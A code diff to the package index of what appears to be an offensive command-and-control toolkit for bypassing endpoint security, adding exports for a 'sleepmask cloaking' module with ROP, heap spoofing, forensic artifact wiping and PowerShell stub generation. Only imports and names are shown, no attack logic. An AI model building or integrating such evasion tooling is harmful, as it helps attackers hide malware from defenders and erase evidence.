@@ -4,6 +4,7 @@ Advanced EDR/AV bypass techniques for C2 operations
 
 Modules:
 - sleep_obfuscation: Memory scanner evasion during sleep
+- sleepmask_cloaking: AI-Dynamic memory cloaking with ROP + heap spoof
 - header_rotation: HTTP/TLS fingerprint randomization
 - anti_sandbox: VM/sandbox detection
 - process_injection: Windows injection techniques
@@ -43,6 +44,15 @@ from .indirect_syscalls import (
 from .multi_layer_obfuscation import (
     ObfuscationLayer, ObfuscationLevel, LayerConfig, ObfuscationConfig,
     ObfuscationResult, MultiLayerObfuscator, PayloadTransformer
+)
+
+# NEW: Sleepmask Cloaking Elite
+from .sleepmask_cloaking import (
+    SleepmaskCloakingEngine, MemoryCloakEngine, ROPGadgetEngine,
+    HeapSpoofEngine, ForensicArtifactWiper, AICloakSelector,
+    CloakLevel, EDRProduct as CloakEDRProduct, MaskStage,
+    create_elite_cloaker, quick_cloak, get_ai_recommendation,
+    generate_ps_cloaking_stub
 )
 
 __all__ = [
@@ -108,4 +118,19 @@ __all__ = [
     'ObfuscationResult',
     'MultiLayerObfuscator',
     'PayloadTransformer',
+    
+    # Sleepmask Cloaking Elite (NEW)
+    'SleepmaskCloakingEngine',
+    'MemoryCloakEngine',
+    'ROPGadgetEngine',
+    'HeapSpoofEngine',
+    'ForensicArtifactWiper',
+    'AICloakSelector',
+    'CloakLevel',
+    'CloakEDRProduct',
+    'MaskStage',
+    'create_elite_cloaker',
+    'quick_cloak',
+    'get_ai_recommendation',
+    'generate_ps_cloaking_stub',
 ]
